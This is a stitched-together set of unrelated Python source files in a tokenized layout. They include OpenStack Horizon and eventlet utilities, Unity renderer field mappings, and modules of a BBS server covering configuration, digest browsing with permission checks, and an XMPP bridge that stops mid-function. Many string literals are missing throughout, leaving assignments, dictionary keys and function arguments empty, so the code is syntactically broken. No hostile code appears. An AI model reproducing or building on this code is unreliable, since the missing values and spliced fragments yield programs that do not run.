utf-8 # vim: tabstop=4 shiftwidth=4 softtabstop=4 \n 
\n 
#    Licensed under the Apache License, Version 2.0 (the "License"); you may \n 
#    not use this file except in compliance with the License. You may obtain \n 
#    a copy of the License at \n 
# \n 
#         http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
#    Unless required by applicable law or agreed to in writing, software \n 
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT \n 
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the \n 
#    License for the specific language governing permissions and limitations \n 
#    under the License. \n 
# \n 
# @author: Abishek Subramanian, Cisco Systems, Inc. \n 
# @author: Sergey Sudakovich,   Cisco Systems, Inc. \n 
\n 
from django . utils . translation import ugettext_lazy as _ # noqa \n 
\n 
from horizon import tabs \n 
\n 
\n 
class NetworkProfileTab ( tabs . Tab ) : \n 
~~~ name = _ ( "Network Profile" ) \n 
slug = "network_profile" \n 
template_name = \n 
\n 
def get_context_data ( self , request ) : \n 
~~~ return None \n 
\n 
\n 
~~ ~~ class PolicyProfileTab ( tabs . Tab ) : \n 
~~~ name = _ ( "Policy Profile" ) \n 
slug = "policy_profile" \n 
template_name = \n 
preload = False \n 
\n 
\n 
~~ class IndexTabs ( tabs . TabGroup ) : \n 
~~~ slug = "indextabs" \n 
tabs = ( NetworkProfileTab , PolicyProfileTab ) \n 
# vim: tabstop=4 shiftwidth=4 softtabstop=4 \n 
\n 
# Copyright 2011 OpenStack Foundation. \n 
# All Rights Reserved. \n 
# \n 
#    Licensed under the Apache License, Version 2.0 (the "License"); you may \n 
#    not use this file except in compliance with the License. You may obtain \n 
#    a copy of the License at \n 
# \n 
#         http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
#    Unless required by applicable law or agreed to in writing, software \n 
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT \n 
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the \n 
#    License for the specific language governing permissions and limitations \n 
#    under the License. \n 
\n 
~~ """Greenthread local storage of variables using weak references""" \n 
\n 
import weakref \n 
\n 
from eventlet import corolocal \n 
\n 
\n 
class WeakLocal ( corolocal . local ) : \n 
~~~ def __getattribute__ ( self , attr ) : \n 
~~~ rval = corolocal . local . __getattribute__ ( self , attr ) \n 
if rval : \n 
# NOTE(mikal): this bit is confusing. What is stored is a weak \n 
# reference, not the value itself. We therefore need to lookup \n 
# the weak reference and return the inner value here. \n 
~~~ rval = rval ( ) \n 
~~ return rval \n 
\n 
~~ def __setattr__ ( self , attr , value ) : \n 
~~~ value = weakref . ref ( value ) \n 
return corolocal . local . __setattr__ ( self , attr , value ) \n 
\n 
\n 
# NOTE(mikal): the name "store" should be deprecated in the future \n 
~~ ~~ store = WeakLocal ( ) \n 
\n 
# A "weak" store uses weak references and allows an object to fall out of scope \n 
# when it falls out of scope in the code that uses the thread local storage. A \n 
# "strong" store will hold a reference to the object so that it never falls out \n 
# of scope. \n 
weak_store = WeakLocal ( ) \n 
strong_store = corolocal . local \n 
#!/usr/bin/env python \n 
# vim: tabstop=4 shiftwidth=4 softtabstop=4 \n 
\n 
#    Copyright 2011 OpenStack Foundation \n 
# \n 
#    Licensed under the Apache License, Version 2.0 (the "License"); you may \n 
#    not use this file except in compliance with the License. You may obtain \n 
#    a copy of the License at \n 
# \n 
#         http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
#    Unless required by applicable law or agreed to in writing, software \n 
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT \n 
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the \n 
#    License for the specific language governing permissions and limitations \n 
#    under the License. \n 
\n 
import eventlet \n 
eventlet . monkey_patch ( ) \n 
\n 
import contextlib \n 
import sys \n 
\n 
from oslo . config import cfg \n 
\n 
from openstack_dashboard . openstack . common import log as logging \n 
from openstack_dashboard . openstack . common import rpc \n 
from openstack_dashboard . openstack . common . rpc import impl_zmq \n 
\n 
CONF = cfg . CONF \n 
CONF . register_opts ( rpc . rpc_opts ) \n 
CONF . register_opts ( impl_zmq . zmq_opts ) \n 
\n 
\n 
def main ( ) : \n 
~~~ CONF ( sys . argv [ 1 : ] , project = ) \n 
logging . setup ( "oslo" ) \n 
\n 
with contextlib . closing ( impl_zmq . ZmqProxy ( CONF ) ) as reactor : \n 
~~~ reactor . consume_in_thread ( ) \n 
reactor . wait ( ) \n 
~~ ~~ from enum import IntEnum \n 
from . component import Component \n 
from . object import field \n 
\n 
\n 
class ReflectionProbeUsage ( IntEnum ) : \n 
~~~ Off = 0 \n 
BlendProbes = 1 \n 
BlendProbesAndSkybox = 2 \n 
Simple = 3 \n 
\n 
\n 
~~ class ShadowCastingMode ( IntEnum ) : \n 
~~~ Off = 0 \n 
On = 1 \n 
TwoSided = 2 \n 
ShadowsOnly = 3 \n 
\n 
\n 
~~ class Renderer ( Component ) : \n 
~~~ enabled = field ( "m_Enabled" , bool ) \n 
lightmap_index = field ( "m_LightmapIndex" ) \n 
materials = field ( "m_Materials" ) \n 
probe_anchor = field ( "m_ProbeAnchor" ) \n 
receive_shadows = field ( "m_ReceiveShadows" , bool ) \n 
reflection_probe_usage = field ( "m_ReflectionProbeUsage" , ReflectionProbeUsage ) \n 
shadow_casting_mode = field ( "m_CastShadows" , ShadowCastingMode ) \n 
sorting_layer_id = field ( "m_SortingLayerID" ) \n 
sorting_order = field ( "m_SortingOrder" ) \n 
use_light_probes = field ( "m_UseLightProbes" , bool ) \n 
lightmap_index_dynamic = field ( "m_LightmapIndexDynamic" ) \n 
lightmap_tiling_offset = field ( "m_LightmapTilingOffset" ) \n 
lightmap_tiling_offset_dynamic = field ( "m_LightmapTilingOffsetDynamic" ) \n 
static_batch_root = field ( "m_StaticBatchRoot" ) \n 
subset_indices = field ( "m_SubsetIndices" ) \n 
\n 
@ property \n 
def material ( self ) : \n 
~~~ return self . materials [ 0 ] \n 
\n 
\n 
~~ ~~ class ParticleSystemRenderMode ( IntEnum ) : \n 
~~~ Billboard = 0 \n 
Stretch = 1 \n 
HorizontalBillboard = 2 \n 
VerticalBillboard = 3 \n 
Mesh = 4 \n 
\n 
\n 
~~ class ParticleSystemSortMode ( IntEnum ) : \n 
~~~ None_ = 0 \n 
Distance = 1 \n 
OldestInFront = 2 \n 
YoungestInFront = 3 \n 
\n 
\n 
~~ class MeshRenderer ( Component ) : \n 
~~~ pass \n 
\n 
\n 
~~ class ParticleRenderer ( Renderer ) : \n 
~~~ camera_velocity_scale = field ( "m_CameraVelocityScale" ) \n 
length_scale = field ( "m_LengthScale" ) \n 
max_particle_size = field ( "m_MaxParticleSize" ) \n 
velocity_scale = field ( "m_VelocityScale" ) \n 
stretch_particles = field ( "m_StretchParticles" ) \n 
uv_animation = field ( "UV Animation" ) \n 
\n 
\n 
~~ class ParticleSystemRenderer ( Renderer ) : \n 
~~~ camera_velocity_scale = field ( "m_CameraVelocityScale" ) \n 
length_scale = field ( "m_LengthScale" ) \n 
max_particle_size = field ( "m_MaxParticleSize" ) \n 
mesh = field ( "m_Mesh" ) \n 
mesh1 = field ( "m_Mesh1" ) \n 
mesh2 = field ( "m_Mesh2" ) \n 
mesh3 = field ( "m_Mesh3" ) \n 
normal_direction = field ( "m_NormalDirection" ) \n 
render_mode = field ( "m_RenderMode" , ParticleSystemRenderMode ) \n 
sort_mode = field ( "m_SortMode" , ParticleSystemSortMode ) \n 
sorting_fudge = field ( "m_SortingFudge" ) \n 
velocity_scale = field ( "m_VelocityScale" ) \n 
#!/usr/bin/env python \n 
~~ from ConfigParser import * \n 
from StringIO import * \n 
from Log import Log \n 
import datetime \n 
\n 
class Config : \n 
~~~ @ staticmethod \n 
def LoadConfig ( ) : \n 
~~~ Config . parser = ConfigParser ( ) \n 
try : \n 
~~~ sconff = open ( CONFIG_FILE , "r" ) \n 
~~ except : \n 
~~~ Log . warn ( "cannot open config file" ) \n 
return \n 
\n 
~~ sconf = StringIO ( ) \n 
sconf . write ( "[sysconf]\\n" ) \n 
sconf . write ( sconff . read ( ) ) \n 
sconf . seek ( 0 ) \n 
Config . parser . readfp ( sconf ) \n 
sconff . close ( ) \n 
sconf . close ( ) \n 
return \n 
\n 
~~ @ staticmethod \n 
def GetBoardsFile ( ) : \n 
~~~ return BOARDS_FILE \n 
\n 
~~ @ staticmethod \n 
def GetInt ( name , defval ) : \n 
~~~ if ( Config . parser . has_option ( , name ) ) : \n 
~~~ return Config . parser . getint ( , name ) \n 
~~ else : \n 
~~~ return defval \n 
\n 
~~ ~~ @ staticmethod \n 
def GetString ( name , defval ) : \n 
~~~ if ( Config . parser . has_option ( , name ) ) : \n 
~~~ val = Config . parser . get ( , name ) \n 
if ( val [ 0 ] == \'"\' and val . endswith ( \'"\' ) ) : \n 
~~~ val = val [ 1 : - 1 ] \n 
~~ return val . decode ( ) \n 
~~ else : \n 
~~~ return defval \n 
\n 
~~ ~~ ~~ BBS_ROOT = \n 
BBS_XMPP_CERT_FILE = BBS_ROOT + "xmpp.crt" \n 
BBS_XMPP_KEY_FILE = BBS_ROOT + "xmpp.key" \n 
\n 
BOARDS_FILE = BBS_ROOT + \n 
STRLEN = 80 \n 
ARTICLE_TITLE_LEN = 60 \n 
BM_LEN = 60 \n 
MAXBOARD = 400 \n 
CONFIG_FILE = BBS_ROOT + \n 
FILENAME_LEN = 20 \n 
OWNER_LEN = 30 \n 
SESSIONID_LEN = 32 \n 
REFRESH_TOKEN_LEN = 128 \n 
NAMELEN = 40 \n 
IDLEN = 12 \n 
MD5PASSLEN = 16 \n 
OLDPASSLEN = 14 \n 
MOBILE_NUMBER_LEN = 17 \n 
MAXCLUB = 128 \n 
MAXUSERS = 20000 \n 
MAX_MSG_SIZE = 1024 \n 
MAXFRIENDS = 400 \n 
MAXMESSAGE = 5 \n 
MAXSIGLINES = 6 \n 
IPLEN = 16 \n 
DEFAULTBOARD = "sysop" \n 
BLESS_BOARD = "happy_birthday" \n 
QUOTED_LINES = 10 \n 
\n 
MAXACTIVE = 8000 \n 
USHM_SIZE = MAXACTIVE + 10 \n 
UTMP_HASHSIZE = USHM_SIZE * 4 \n 
UCACHE_SEMLOCK = 0 \n 
LEN_FRIEND_EXP = 15 \n 
\n 
REFRESH_TIME = 30 # time between friend list update \n 
USER_TITLE_LEN = 18 # used in UCache \n 
SESSION_TIMEOUT = datetime . timedelta ( 30 ) \n 
SESSION_TIMEOUT_SECONDS = 86400 * 30 \n 
\n 
XMPP_IDLE_TIME = 300 \n 
XMPP_LONG_IDLE_TIME = 1800 \n 
\n 
XMPP_UPDATE_TIME_INTERVAL = 10 \n 
XMPP_PING_TIME_INTERVAL = 60 \n 
\n 
PUBLIC_SHMKEY = 3700 \n 
MAX_ATTACHSIZE = 20 * 1024 * 1024 \n 
\n 
BMDEL_DECREASE = True \n 
SYSMAIL_BOARD = "sysmail" \n 
ADD_EDITMARK = True \n 
SEARCH_COUNT_LIMIT = 20 \n 
\n 
MAIL_SIZE_LIMIT = - 1 \n 
\n 
SEC_DELETED_OLDHOME = 3600 * 24 * 3 \n 
SELF_INTRO_MAX_LEN = 800 \n 
import re \n 
import os \n 
import stat \n 
import json \n 
import struct \n 
import time \n 
import Config \n 
import Board \n 
import Post \n 
import BoardManager \n 
from Util import Util \n 
from Log import Log \n 
from errors import * \n 
\n 
DEFAULT_DIGEST_LIST_COUNT = 20 \n 
\n 
class DigestItem : \n 
~~~ def __init__ ( self , basepath ) : \n 
~~~ self . basepath = basepath \n 
self . title = \n 
self . host = \n 
self . port = 0 \n 
self . attachpos = 0 \n 
self . fname = \n 
self . mtitle = \n 
self . items = [ ] \n 
self . update_time = 0 \n 
\n 
self . id = 0 \n 
self . sysop_only = 0 \n 
self . bms_only = 0 \n 
self . zixia_only = 0 \n 
\n 
~~ def IsDir ( self ) : \n 
~~~ try : \n 
~~~ st = os . stat ( self . realpath ( ) ) \n 
return stat . S_ISDIR ( st . st_mode ) \n 
~~ except : \n 
~~~ return False \n 
\n 
~~ ~~ def IsFile ( self ) : \n 
~~~ try : \n 
~~~ st = os . stat ( self . realpath ( ) ) \n 
return stat . S_ISREG ( st . st_mode ) \n 
~~ except : \n 
~~~ return False \n 
\n 
~~ ~~ def GetModTime ( self ) : \n 
~~~ try : \n 
~~~ st = os . stat ( self . realpath ( ) ) \n 
mtime = st . st_mtime \n 
~~ except : \n 
~~~ mtime = time . time ( ) \n 
~~ return mtime \n 
\n 
~~ def names_path ( self ) : \n 
~~~ return "%s/.Names" % self . realpath ( ) \n 
\n 
~~ def realpath ( self ) : \n 
~~~ return "%s/%s" % ( Config . BBS_ROOT , self . path ( ) ) \n 
\n 
~~ def path ( self ) : \n 
~~~ if ( self . fname ) : \n 
~~~ return "%s/%s" % ( self . basepath , self . fname ) \n 
~~ else : \n 
~~~ return self . basepath \n 
\n 
~~ ~~ def CheckUpdate ( self ) : \n 
~~~ try : \n 
~~~ stat = os . stat ( self . names_path ( ) ) \n 
if ( stat . st_mtime > self . update_time ) : \n 
~~~ self . LoadNames ( ) \n 
~~ ~~ except : \n 
\n 
# so we should update the upper layer... \n 
~~~ return False \n 
\n 
~~ return True \n 
\n 
~~ def LoadNames ( self ) : \n 
~~~ try : \n 
~~~ f = open ( self . names_path ( ) , "r" ) \n 
~~ except IOError : \n 
~~~ return 0 \n 
\n 
~~ stat = os . fstat ( f . fileno ( ) ) \n 
self . update_time = stat . st_mtime \n 
\n 
item = DigestItem ( self . path ( ) ) \n 
\n 
hostname = \n 
_id = 0 \n 
bms_only = 0 \n 
sysop_only = 0 \n 
zixia_only = 0 \n 
while ( True ) : \n 
~~~ line = f . readline ( ) \n 
if ( line == "" ) : break \n 
npos = line . find ( "\\n" ) \n 
if ( npos != - 1 ) : line = line [ : npos ] \n 
\n 
if ( line [ : 1 ] == ) : \n 
~~~ if ( line [ : 8 ] == "# Title=" ) : \n 
~~~ if ( not self . mtitle ) : \n 
~~~ self . mtitle = line [ 8 : ] \n 
~~ ~~ ~~ result = re . match ( , line ) \n 
if ( result ) : \n 
~~~ key = result . group ( 1 ) \n 
value = result . group ( 2 ) \n 
if ( key == "Name" ) : \n 
~~~ item . title = value \n 
item . attachpos = 0 \n 
~~ elif ( key == "Path" ) : \n 
~~~ if ( value [ : 2 ] == "~/" ) : \n 
~~~ item . fname = value [ 2 : ] \n 
~~ else : \n 
~~~ item . fname = value \n 
~~ if ( item . fname . find ( ".." ) != - 1 ) : \n 
~~~ continue \n 
~~ if ( item . title . find ( "(BM: BMS)" ) != - 1 ) : \n 
~~~ bms_only += 1 \n 
~~ elif ( item . title . find ( "(BM: SYSOPS)" ) != - 1 ) : \n 
~~~ sysop_only += 1 \n 
~~ elif ( item . title . find ( "(BM: ZIXIAs)" ) != - 1 ) : \n 
~~~ zixia_only += 1 \n 
~~ if ( item . fname . find ( "!@#$%" ) != - 1 ) : \n 
~~~ parts = re . split ( , item . fname ) \n 
newparts = [ ] \n 
for part in parts : \n 
~~~ if ( part ) : \n 
~~~ newparts += [ part ] \n 
~~ ~~ hostname = newparts [ 0 ] \n 
item . fname = newparts [ 1 ] \n 
try : \n 
~~~ item . port = int ( newparts [ 2 ] ) \n 
~~ except : \n 
~~~ item . port = 0 \n 
~~ ~~ item . id = _id \n 
_id += 1 \n 
item . bms_only = bms_only \n 
item . sysop_only = sysop_only \n 
item . zixia_only = zixia_only \n 
item . host = hostname \n 
self . items += [ item ] \n 
item = DigestItem ( self . path ( ) ) \n 
hostname = \n 
~~ elif ( key == "Host" ) : \n 
~~~ hostname = value \n 
~~ elif ( key == "Port" ) : \n 
~~~ try : \n 
~~~ item . port = int ( value ) \n 
~~ except : \n 
~~~ item . port = 0 \n 
~~ ~~ elif ( key == "Attach" ) : \n 
~~~ try : \n 
~~~ item . attachpos = int ( value ) \n 
~~ except : \n 
~~~ item . attachpos = 0 \n 
\n 
~~ ~~ ~~ ~~ f . close ( ) \n 
return 1 \n 
\n 
~~ def GetItem ( self , user , route , has_perm = False , need_perm = False ) : \n 
~~~ self . CheckUpdate ( ) \n 
\n 
# for normal items, permission does not matter \n 
if ( self . mtitle . find ( "(BM:" ) != - 1 ) : \n 
~~~ if ( Board . Board . IsBM ( user , self . mtitle [ 4 : ] , ) or user . IsSysop ( ) ) : \n 
~~~ has_perm = True \n 
~~ elif ( need_perm and not has_perm ) : \n 
~~~ return None \n 
~~ ~~ if ( self . mtitle . find ( "(BM: BMS)" ) != - 1 \n 
or self . mtitle . find ( "(BM: SECRET)" ) != - 1 \n 
or self . mtitle . find ( "(BM: SYSOPS)" ) != - 1 ) : \n 
~~~ need_perm = True # take effect at next level... \n 
\n 
~~ if ( len ( route ) == 0 ) : \n 
~~~ return self \n 
~~ target = route [ 0 ] - 1 \n 
_id = target \n 
if ( _id >= len ( self . items ) ) : \n 
~~~ return None \n 
~~ while ( self . items [ _id ] . EffectiveId ( user ) < target ) : \n 
~~~ _id += 1 \n 
if ( _id >= len ( self . items ) ) : \n 
~~~ return None \n 
~~ ~~ item = self . items [ _id ] \n 
# what the .... \n 
item . mtitle = item . title \n 
if ( len ( route ) == 1 ) : \n 
# last level... \n 
~~~ return item \n 
~~ else : \n 
~~~ if ( item . IsDir ( ) ) : \n 
~~~ if ( not item . CheckUpdate ( ) ) : \n 
~~~ return None \n 
~~ return item . GetItem ( user , route [ 1 : ] , has_perm , need_perm ) \n 
~~ else : \n 
~~~ return None \n 
\n 
~~ ~~ ~~ def GetRange ( self , user , route , start , end , has_perm = False , need_perm = False ) : \n 
~~~ self . CheckUpdate ( ) \n 
\n 
# only for permission check \n 
firstitem = self . GetItem ( user , route + [ start ] , has_perm , need_perm ) \n 
if ( not firstitem ) : \n 
~~~ return [ ] \n 
# range? disabled for partial result \n 
#lastitem = self.GetItem(user, route + [end], has_perm, need_perm) \n 
#if (not lastitem): \n 
#    return None \n 
\n 
~~ parent = self . GetItem ( user , route , has_perm , need_perm ) \n 
if ( not parent ) : \n 
~~~ return [ ] \n 
~~ if ( not parent . IsDir ( ) ) : \n 
~~~ return [ ] \n 
\n 
~~ result = [ ] \n 
_id = start - 1 \n 
for i in range ( start , end + 1 ) : \n 
~~~ target = i - 1 \n 
if ( _id >= len ( parent . items ) ) : \n 
~~~ return [ ] \n 
~~ while ( parent . items [ _id ] . EffectiveId ( user ) < target ) : \n 
~~~ _id += 1 \n 
if ( _id >= len ( parent . items ) ) : \n 
# give partial result instead of error... \n 
~~~ return result \n 
~~ ~~ item = parent . items [ _id ] \n 
# necessary?... \n 
item . mtitle = item . title \n 
result += [ item ] \n 
\n 
~~ return result \n 
\n 
~~ def EffectiveId ( self , user ) : \n 
~~~ _id = self . id \n 
if ( user . IsSysop ( ) ) : \n 
~~~ return _id \n 
~~ if ( not user . IsSysop ( ) ) : \n 
~~~ _id -= self . sysop_only \n 
~~ if ( not user . IsBM ( ) ) : \n 
~~~ _id -= self . bms_only \n 
~~ if ( not user . IsSECANC ( ) ) : \n 
~~~ _id -= self . zixia_only \n 
~~ return _id \n 
\n 
~~ def GetInfo ( self ) : \n 
~~~ info = { } \n 
info [ ] = Util . gbkDec ( self . mtitle ) \n 
info [ ] = Util . gbkDec ( self . title ) \n 
info [ ] = self . attachpos \n 
if ( self . host != ) : \n 
~~~ info [ ] = self . host \n 
info [ ] = self . port \n 
info [ ] = \n 
~~ elif ( self . IsDir ( ) ) : \n 
~~~ info [ ] = \n 
~~ elif ( self . IsFile ( ) ) : \n 
~~~ info [ ] = \n 
~~ else : \n 
~~~ info [ ] = \n 
~~ info [ ] = int ( self . GetModTime ( ) ) \n 
return info \n 
\n 
~~ def GetInfoForUser ( self , user ) : \n 
~~~ info = self . GetInfo ( ) \n 
info [ ] = self . EffectiveId ( user ) + 1 \n 
return info \n 
\n 
~~ def GetAttachLink ( self , session ) : \n 
~~~ _hash = Util . HashGen ( self . path ( ) , "python nb" ) \n 
filename = \n 
for i in range ( 2 ) : \n 
~~~ filename += "%0x" % struct . unpack ( , _hash [ i * 4 : ( i + 1 ) * 4 ] ) \n 
~~ link = "http://%s/bbscon.php?b=xattach&f=%s" % ( session . GetMirror ( Config . Config . GetInt ( , 80 ) ) , filename ) \n 
\n 
linkfile = "%s/boards/xattach/%s" % ( Config . BBS_ROOT , filename ) \n 
target = "../../%s" % self . path ( ) \n 
try : \n 
~~~ os . symlink ( target , linkfile ) \n 
~~ except : \n 
# we should not omit other errors \n 
# anyway... \n 
~~~ pass \n 
~~ return link \n 
\n 
~~ ~~ class Digest : \n 
~~~ root = DigestItem ( "0Announce" ) \n 
def __init__ ( self , board , path ) : \n 
~~~ self . board = board \n 
self . path = path \n 
self . root = DigestItem ( self . path ) \n 
\n 
~~ @ staticmethod \n 
def GET ( svc , session , params , action ) : \n 
~~~ if ( session is None ) : raise Unauthorized ( ) \n 
if not session . CheckScope ( ) : raise NoPerm ( "out of scope" ) \n 
user = session . GetUser ( ) \n 
boardname = svc . get_str ( params , , ) \n 
if ( boardname ) : \n 
~~~ board = BoardManager . BoardManager . GetBoard ( boardname ) \n 
if ( board is None ) : raise NotFound ( % boardname ) \n 
if ( not board . CheckReadPerm ( user ) ) : \n 
~~~ raise NoPerm ( ) \n 
~~ basenode = board . digest . root \n 
has_perm = user . IsDigestMgr ( ) or user . IsSysop ( ) or user . IsSuperBM ( ) \n 
~~ else : \n 
~~~ basenode = Digest . root \n 
has_perm = user . IsDigestMgr ( ) \n 
\n 
~~ if ( action == "list" ) : \n 
~~~ route = svc . get_str ( params , ) \n 
start = svc . get_int ( params , , 1 ) \n 
end = svc . get_int ( params , , start + DEFAULT_DIGEST_LIST_COUNT - 1 ) \n 
Digest . List ( svc , basenode , route , start , end , session , has_perm ) \n 
return \n 
~~ elif ( action == "view" ) : \n 
~~~ route = svc . get_str ( params , ) \n 
start = svc . get_int ( params , , 0 ) \n 
count = svc . get_int ( params , , 0 ) \n 
Digest . View ( svc , basenode , route , session , has_perm , start , count ) \n 
return \n 
~~ else : \n 
~~~ raise WrongArgs ( % action ) \n 
\n 
~~ ~~ @ staticmethod \n 
def ParseRoute ( route ) : \n 
~~~ ret = [ ] \n 
items = re . split ( , route ) \n 
\n 
items = items [ 1 : ] \n 
for item in items : \n 
~~~ try : \n 
~~~ ret += [ int ( item ) ] \n 
~~ except : \n 
~~~ raise WrongArgs ( % item ) \n 
~~ ~~ return ret \n 
\n 
~~ @ staticmethod \n 
def List ( svc , basenode , route , start , end , session , has_perm ) : \n 
~~~ route_array = Digest . ParseRoute ( route ) \n 
parent = basenode . GetItem ( session . GetUser ( ) , route_array , has_perm ) \n 
if ( not parent ) : \n 
~~~ raise WrongArgs ( % route ) \n 
~~ if ( not parent . IsDir ( ) ) : \n 
~~~ raise WrongArgs ( % route ) \n 
~~ items = basenode . GetRange ( session . GetUser ( ) , route_array , start , end , has_perm ) \n 
result = { } \n 
result [ ] = parent . GetInfoForUser ( session . GetUser ( ) ) \n 
result [ ] = len ( items ) \n 
result_list = [ ] \n 
for item in items : \n 
~~~ result_list += [ item . GetInfoForUser ( session . GetUser ( ) ) ] \n 
~~ result [ ] = result_list \n 
\n 
svc . writedata ( json . dumps ( result ) ) \n 
\n 
~~ @ staticmethod \n 
def View ( svc , basenode , route , session , has_perm , start , count ) : \n 
~~~ route_array = Digest . ParseRoute ( route ) \n 
item = basenode . GetItem ( session . GetUser ( ) , route_array , has_perm ) \n 
if ( not item ) : \n 
~~~ raise WrongArgs ( % route ) \n 
~~ if ( not item . IsFile ( ) ) : \n 
~~~ raise WrongArgs ( % route ) \n 
~~ result = { } \n 
result [ ] = item . GetInfoForUser ( session . GetUser ( ) ) \n 
postinfo = Post . Post ( item . realpath ( ) , None ) \n 
( result [ ] , result [ ] ) = postinfo . GetContent ( start , count ) \n 
attachlist = postinfo . GetAttachListByType ( ) \n 
result [ ] = attachlist [ 0 ] \n 
result [ ] = attachlist [ 1 ] \n 
if ( attachlist [ 0 ] or attachlist [ 1 ] ) : \n 
~~~ result [ ] = item . GetAttachLink ( session ) \n 
~~ svc . writedata ( json . dumps ( result ) ) \n 
\n 
\n 
~~ ~~ import time \n 
\n 
import UserManager \n 
import UserInfo \n 
from Session import Session \n 
from Log import Log \n 
import UCache \n 
import Config \n 
import MsgBox \n 
import xmpp \n 
import modes \n 
import Util \n 
import traceback \n 
import os \n 
from xmpp . features import NoRoute \n 
\n 
__disco_info_ns__ = \n 
__disco_items_ns__ = \n 
__vcard_ns__ = \n 
\n 
STEAL_AFTER_SEEN = 3 \n 
\n 
def elem_to_str ( elem ) : \n 
~~~ return "<%r %r>%r</>" % ( elem . tag , elem . attrib , elem . text ) \n 
\n 
~~ class XMPPServer ( xmpp . Plugin ) : \n 
~~~ """XMPP server for the BBS""" \n 
\n 
def __init__ ( self , rosters , host ) : \n 
~~~ self . probed = False \n 
self . _closed = False \n 
self . rosters = rosters \n 
self . _session = None \n 
\n 
self . rosters . set_resources ( self . get_resources ( ) ) \n 
\n 
self . _fixedjid = UCache . UCache . formalize_jid ( unicode ( self . authJID ) ) \n 
self . _userid = self . _fixedjid . partition ( ) [ 0 ] . encode ( "gbk" ) \n 
\n 
if ( not self . rosters . allow_login ( self . authJID . bare ) ) : \n 
~~~ Log . warn ( "user %s login denied" % self . _userid ) \n 
#            self.unbind_res() \n 
self . stream_error ( , ) \n 
return \n 
~~ Log . info ( "%s: session start" % unicode ( self . authJID ) ) \n 
\n 
if self . authJID . resource [ : - 8 ] != "Resource" and len ( self . authJID . resource ) > 8 : \n 
~~~ try : \n 
~~~ routes = self . routes ( self . authJID . bare ) \n 
for route in routes : \n 
~~~ jid = route [ 0 ] \n 
if jid . resource [ : - 8 ] == self . authJID . resource [ : - 8 ] : \n 
~~~ if jid . resource != self . authJID . resource : \n 
# old resource! \n 
~~~ Log . info ( "old jid: %s %r" % ( jid . full , route [ 1 ] ) ) \n 
route [ 1 ] . stream_error ( , ) \n 
~~ ~~ else : \n 
~~~ Log . info ( "another me: %s %r" % ( jid . full , route [ 1 ] ) ) \n 
~~ ~~ ~~ except NoRoute : \n 
~~~ pass \n 
~~ Log . debug ( "%s: checked for old sessions" % self . authJID . full ) \n 
\n 
# Login the user \n 
~~ self . _user = UserManager . UserManager . LoadUser ( self . _userid ) \n 
if ( self . _user == None ) : \n 
~~~ raise Exception ( "How can that be!" ) \n 
~~ self . _peer_addr = self . getpeername ( ) \n 
self . _session = Session ( self . _user , self . _peer_addr [ 0 ] ) \n 
self . _session . RecordLogin ( ) \n 
# insert into global session list! \n 
self . _userinfo = self . _session . Register ( ) \n 
self . _loginid = self . _session . utmpent \n 
self . _hostname = host \n 
self . bind ( xmpp . ReceivedCloseStream , self . recv_close ) \n 
self . bind ( xmpp . StreamClosed , self . stream_closed ) \n 
self . bind ( xmpp . SentCloseStream , self . sent_close ) \n 
\n 
self . rosters . register_conn ( self ) \n 
\n 
msgbox = MsgBox . MsgBox ( self . _userid ) \n 
if self . rosters . get_xmpp_read ( self . _user . GetUID ( ) ) is None : \n 
~~~ self . rosters . set_xmpp_read ( self . _user . GetUID ( ) , msgbox . GetMsgCount ( all = False ) - msgbox . GetUnreadCount ( ) ) \n 
~~ self . check_msg ( ) \n 
\n 
~~ def get_loginid ( self ) : \n 
~~~ return self . _loginid \n 
\n 
~~ def recv_close ( self ) : \n 
~~~ Log . debug ( "%s: close because he wants to" % self . authJID . full ) \n 
return self . close ( ) \n 
\n 
~~ def stream_closed ( self ) : \n 
~~~ Log . debug ( "%s: close because stream closed" % self . authJID . full ) \n 
return self . close ( ) \n 
\n 
~~ def sent_close ( self ) : \n 
~~~ Log . debug ( "%s: close because we want to" % self . authJID . full ) \n 
return self . close ( ) \n 
\n 
~~ def close ( self ) : \n 
~~~ if ( self . _closed ) : \n 
~~~ Log . debug ( "already closed. ignore" ) \n 
return \n 
~~ self . _closed = True \n 
Log . info ( "%s: session end" % unicode ( self . authJID ) ) \n 
if ( self . _session ) : \n 
~~~ self . _session . Unregister ( ) \n 
~~ self . unbind_res ( ) \n 
self . rosters . unregister_conn ( self ) \n 
\n 
~~ @ xmpp . iq ( ) \n 
def ping ( self , iq ) : \n 
~~~ """Handle ping requests""" \n 
\n 
self . refresh ( ) \n 
return self . iq ( , iq ) \n 
\n 
~~ @ xmpp . stanza ( ) \n 
def message ( self , elem ) : \n 
~~~ """Proxy message from one user to another""" \n 
\n 
# so, possible: \n 
# XMPP user -> Old user \n 
# XMPP user -> XMPP user => make it like XMPP->old \n 
\n 
# Old user -> XMPP user (emulated) => handled elsewhere \n 
\n 
to_jid = elem . get ( ) \n 
from_jid = elem . get ( ) \n 
if ( from_jid == None ) : \n 
~~~ return \n 
\n 
#       self.recv(to_jid, elem) \n 
\n 
~~ text_body = None \n 
for child in elem : \n 
~~~ if ( child . tag . endswith ( ) ) : \n 
~~~ text_body = child . text \n 
~~ ~~ if ( text_body == None ) : \n 
~~~ return \n 
\n 
~~ ret = self . rosters . send_msg ( from_jid , to_jid , text_body ) \n 
if ( ret <= 0 ) : \n 
~~~ Log . warn ( "sendmsg() failed to %s from %s error %d" % ( to_jid , from_jid , ret ) ) \n 
errors = { \n 
- 1 : "That user has locked screen, please send later." , \n 
- 11 : "That user denied your message." , \n 
- 12 : "That user has too many unread messages. Please send later." , \n 
- 13 : "User has gone after message sent." , \n 
- 14 : "User has gone before message sent." , \n 
- 2 : "User has gone before message sent." , \n 
- 21 : "Error when sending message!" } \n 
if ( ret in errors ) : \n 
~~~ elem = self . E . message ( { : to_jid , \n 
: from_jid , \n 
: } , \n 
self . E . body ( errors [ ret ] ) ) \n 
self . recv ( from_jid , elem ) \n 
# -2: no perm to see cloak \n 
# 0: error \n 
# -1: lockscreen \n 
# -11: blocked \n 
# -12: too many messages \n 
# -13: user gone when notifying \n 
# -14: user gone before saving \n 
